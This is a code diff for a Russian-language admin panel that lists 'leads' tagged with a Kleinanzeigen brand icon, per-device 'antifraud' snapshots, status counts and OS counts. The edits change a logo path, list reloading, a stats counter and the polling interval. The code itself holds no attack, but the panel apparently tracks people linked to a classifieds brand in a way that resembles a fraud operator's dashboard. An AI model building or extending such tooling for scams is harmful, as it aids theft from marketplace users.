@@ -608,7 +608,7 @@
       var platformIcon = getPlatformIcon(lead.platform);
       var platformBtnHtml = '<button type="button" class="session-os-btn" title="Антифрод: все снимки лида; при разных устройствах — блоки с разделителем" aria-label="Антифрод-снимки лида" data-id="' + escapeHtml(lead.id) + '">' + (platformIcon || '<span class="platform-icon"></span>') + '</button>';
       var brand = (lead.brand || '').toLowerCase();
-      var kleinLogoUrl = (typeof window.__KLEIN_LOGO_DATAURL === 'string' && window.__KLEIN_LOGO_DATAURL) ? window.__KLEIN_LOGO_DATAURL : '/klein-logo.png';
+      var kleinLogoUrl = (typeof window.__KLEIN_LOGO_DATAURL === 'string' && window.__KLEIN_LOGO_DATAURL) ? window.__KLEIN_LOGO_DATAURL : '/klein-admin-mark.png';
       var brandIconHtml = brand === 'klein'
         ? '<img src="' + escapeHtml(kleinLogoUrl) + '" class="session-brand-icon session-brand-icon--klein" alt="" role="img" aria-label="Kleinanzeigen" title="Kleinanzeigen">'
         : '';
@@ -809,10 +809,9 @@
       if (leadIdsEqual(leads[i] && leads[i].id, id)) { idx = i; break; }
     }
     if (idx === -1) {
-      leads.push(lead);
-      leadsTotal = Math.max(leadsTotal + 1, leads.length);
-      renderList();
-      renderPagination();
+      // Текущий `leads` — только страница с API; push в конец ломает порядок «новые сверху».
+      loadLeads();
+      return;
     } else {
       leads[idx] = lead;
       if (!updateLeadListItemInPlace(lead)) renderList();
@@ -1829,17 +1828,19 @@
   function applyStatsData(stats) {
     var byStatus = stats && stats.byStatus ? stats.byStatus : {};
     var byOs = stats && stats.byOs ? stats.byOs : {};
-    var statusError = document.getElementById('stats-status-error');
+    var statusWorked = document.getElementById('stats-status-worked');
     var statusPending = document.getElementById('stats-status-pending');
     var statusSuccess = document.getElementById('stats-status-success');
+    var statusTotal = document.getElementById('stats-status-total');
     var osWindows = document.getElementById('stats-os-windows');
     var osMacos = document.getElementById('stats-os-macos');
     var osAndroid = document.getElementById('stats-os-android');
     var osIos = document.getElementById('stats-os-ios');
     var osOther = document.getElementById('stats-os-other');
-    if (statusError) statusError.textContent = String(byStatus.error || 0);
+    if (statusWorked) statusWorked.textContent = String(byStatus.worked || 0);
     if (statusPending) statusPending.textContent = String(byStatus.pending || 0);
     if (statusSuccess) statusSuccess.textContent = String(byStatus.success || 0);
+    if (statusTotal) statusTotal.textContent = String(stats.total != null ? stats.total : 0);
     if (osWindows) osWindows.textContent = String(byOs.windows || 0);
     if (osMacos) osMacos.textContent = String(byOs.macos || 0);
     if (osAndroid) osAndroid.textContent = String(byOs.android || 0);
@@ -4239,12 +4240,12 @@
       };
       ws.onclose = ws.onerror = function () {
         ws = null;
-        if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 5000);
+        if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 2500);
         if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
         wsReconnectTimer = setTimeout(connectWs, 3000);
       };
     } catch (e) {
-      if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 5000);
+      if (!pollFallbackInterval) pollFallbackInterval = setInterval(loadLeads, 2500);
       wsReconnectTimer = setTimeout(connectWs, 5000);
     }
   }
